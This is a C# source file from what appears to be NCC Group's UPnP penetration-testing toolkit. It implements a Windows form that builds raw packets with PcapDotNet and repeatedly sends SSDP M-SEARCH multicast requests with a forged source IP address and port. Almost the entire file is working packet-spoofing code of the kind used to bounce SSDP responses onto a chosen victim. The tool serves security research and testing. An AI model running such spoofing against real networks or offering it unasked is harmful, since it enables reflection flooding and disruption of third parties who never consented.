/*

Released as open source by NCC Group Plc - http://www.nccgroup.com/

Developed by David.Middlehurst (@dtmsecurity), david dot middlehurst at nccgroup dot com

https://github.com/nccgroup/UPnP-Pentest-Toolkit

Released under AGPL see LICENSE for more information

This tool is a proof of concept and is intended to be used for research purposes in a trusted environment.

*/
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using PcapDotNet;
using PcapDotNet.Packets;
using PcapDotNet.Packets.Ethernet;
using PcapDotNet.Packets.IpV4;
using PcapDotNet.Packets.Transport;
using PcapDotNet.Core;

namespace WinUPnPFun
{
    public partial class MSearchSpoof : Form
    {
        IList<LivePacketDevice> allDevices = LivePacketDevice.AllLocalMachine;

        public MSearchSpoof()
        {
            InitializeComponent();
        }

        private void MSearchSpoof_Load(object sender, EventArgs e)
        {
            

            if (allDevices.Count == 0)
            {
                Console.WriteLine("No interfaces found! Make sure WinPcap is installed.");
            }

            for (int i = 0; i != allDevices.Count; ++i)
            {
                LivePacketDevice device = allDevices[i];
                networkInterfaces.Items.Add(String.Format("{1} {0}", device.Name, device.Description != null ? String.Format(" ({0})", device.Description) : "[No Description] "));
            }
        }

        private void networkInterfaces_SelectedIndexChanged(object sender, EventArgs e)
        {
            LivePacketDevice device = allDevices[networkInterfaces.SelectedIndex];
            for (int i = 0; i != device.Addresses.Count; ++i)
            {
                DeviceAddress address = device.Addresses[i];
                if (address.Address.Family.ToString() == "Internet")
                {
                    string[] addressParts = address.Address.ToString().Split();
                    targetIP.Text = addressParts[1];
                }
            }

        }


        static void msearch_spoof(PacketDevice selectedDevice, String source_ip, UInt16 port)
        {

            String msearch_string = "M-SEARCH * HTTP/1.1\r\nHOST:239.255.255.250:1900\r\nST: ssdp:all\r\nMAN: \"ssdp:discover\"\r\nMX:2\r\n\r\n";


            byte[] temp = System.Text.Encoding.ASCII.GetBytes(msearch_string);



            EthernetLayer ethernetLayer = new EthernetLayer
            {
                Source = new MacAddress(),
                Destination = new MacAddress("01:00:5E:7F:FF:FA"),
                EtherType = EthernetType.None,

            };

            IpV4Layer ipV4Layer = new IpV4Layer
            {
                Source = new IpV4Address(source_ip),
                CurrentDestination = new IpV4Address("239.255.255.250"),
                Fragmentation = IpV4Fragmentation.None,
                HeaderChecksum = null,

                Identification = 1,
                Options = IpV4Options.None,
                Protocol = null,
                Ttl = 64,
                TypeOfService = 0,
            };

            UdpLayer udpLayer = new UdpLayer
            {
                SourcePort = port,
                DestinationPort = 1900,
                Checksum = null,
                CalculateChecksumValue = true,
            };

            PayloadLayer payloadLayer = new PayloadLayer
            {
                Data = new Datagram(temp),
            };

            PacketBuilder builder = new PacketBuilder(ethernetLayer, ipV4Layer, udpLayer, payloadLayer);

            using (PacketCommunicator communicator = selectedDevice.Open(69559, PacketDeviceOpenAttributes.Promiscuous, 1000)) // read timeout
            {
                communicator.SendPacket(builder.Build(DateTime.Now));
            }

        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            msearch_spoof(allDevices[networkInterfaces.SelectedIndex], targetIP.Text, ushort.Parse(targetPort.Text));

            spoofLog.Text = String.Format("Spoofed M-Search from {0} on port {1} [{2}]\r\n", targetIP.Text, targetPort.Text, DateTime.Now) + spoofLog.Text;
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            if (int.Parse(textBox1.Text) > trackBar1.Maximum)
            {
                trackBar1.Maximum = int.Parse(textBox1.Text);
            }
            if (int.Parse(textBox1.Text) < trackBar1.Minimum)
            {
                trackBar1.Minimum = int.Parse(textBox1.Text);
            }
            trackBar1.Value = int.Parse(textBox1.Text);

            timer1.Interval = int.Parse(textBox1.Text);
        }

        private void trackBar1_Scroll(object sender, EventArgs e)
        {
            textBox1.Text = trackBar1.Value.ToString();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (networkInterfaces.SelectedIndex == -1)
            {
                MessageBox.Show("Please select a network interface first.",
                               "Select a network interface",
                               MessageBoxButtons.OK,
                               MessageBoxIcon.Exclamation,
                               MessageBoxDefaultButton.Button1);
            }
            else
            {
                timer1.Interval = int.Parse(textBox1.Text);
                timer1.Start();
                timer1_Tick(null, null);
                button1.Enabled = false;
                button2.Enabled = true;
                networkInterfaces.Enabled = false;
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            timer1.Stop();
            button1.Enabled = true;
            button2.Enabled = false;
            networkInterfaces.Enabled = true;
        }
    }
}
